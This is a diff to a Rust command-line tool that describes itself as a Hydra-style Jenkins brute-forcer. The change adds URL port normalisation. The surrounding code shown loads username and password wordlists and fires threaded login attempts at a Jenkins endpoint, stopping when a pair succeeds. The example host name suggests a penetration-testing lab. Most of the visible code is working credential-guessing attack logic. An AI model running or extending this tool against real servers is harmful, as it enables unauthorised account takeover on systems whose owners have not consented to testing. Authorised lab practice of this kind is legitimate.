@@ -9,6 +9,7 @@ use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 use reqwest::blocking::{Client, Response};
+use url::Url;
 
 /// Hydra‑style Jenkins brute‑forcer (configurable login POST path)
 #[derive(Parser, Debug)]
@@ -18,7 +19,7 @@ use reqwest::blocking::{Client, Response};
     after_help = "Credentials:\n  -l = one username   -L = file of usernames (uppercase)\n  -p = one password   -P = file of passwords (uppercase)\n\nRequires --url, at least one of -l/-L, and at least one of -p/-P."
 )]
 struct Args {
-    /// Target Jenkins base URL (e.g., http://jenkins.inlanefreight.local:8000)
+    /// Target Jenkins base URL (e.g., http://jenkins.inlanefreight.local:8000). If you omit the port, :80 is used for http and :443 for https.
     #[arg(short = 'u', long = "url", required = true, value_name = "URL")]
     url: String,
 
@@ -62,6 +63,31 @@ fn load_wordlist(path: &str, option_label: &str) -> Result<Vec<String>> {
         }
     }
     Ok(lines)
+}
+
+/// If the URL has no port, set http → :80 and https → :443 so the base URL is explicit.
+fn normalize_base_url(url: &str) -> Result<String> {
+    let mut parsed = Url::parse(url).map_err(|e| anyhow::anyhow!("invalid --url: {e}"))?;
+    if parsed.port().is_none() {
+        match parsed.scheme() {
+            "http" => {
+                parsed
+                    .set_port(Some(80))
+                    .map_err(|_| anyhow::anyhow!("invalid --url (could not use port 80)"))?;
+            }
+            "https" => {
+                parsed
+                    .set_port(Some(443))
+                    .map_err(|_| anyhow::anyhow!("invalid --url (could not use port 443)"))?;
+            }
+            _ => {}
+        }
+    }
+    let mut s = parsed.to_string();
+    while s.ends_with('/') {
+        s.pop();
+    }
+    Ok(s)
 }
 
 fn target_login(
@@ -181,7 +207,7 @@ fn run() -> Result<()> {
              Example: --url http://jenkins.example:8080"
         );
     }
-    let url = url.trim_end_matches('/');
+    let url = normalize_base_url(url)?;
 
     let endpoint = args.endpoint.trim().trim_matches('/').to_string();
     if endpoint.is_empty() {
@@ -318,7 +344,7 @@ fn run() -> Result<()> {
     );
     println!("[*] Login endpoint: /{}", endpoint);
     println!("[*] Probing target (single request)…");
-    preflight_login(&client, url, &endpoint)?;
+    preflight_login(&client, &url, &endpoint)?;
     println!("[*] Host responded over HTTP; starting brute-force.");
     println!(
         "[*] Trying {} users × {} passwords",
@@ -359,7 +385,7 @@ fn run() -> Result<()> {
                     return false;
                 }
                 progress.bump();
-                match target_login(&client, url, &endpoint, &user, pass.as_str()) {
+                match target_login(&client, &url, &endpoint, &user, pass.as_str()) {
                     Ok(true) => {
                         got_http_response.store(true, Ordering::Relaxed);
                         stop.store(true, Ordering::Relaxed);
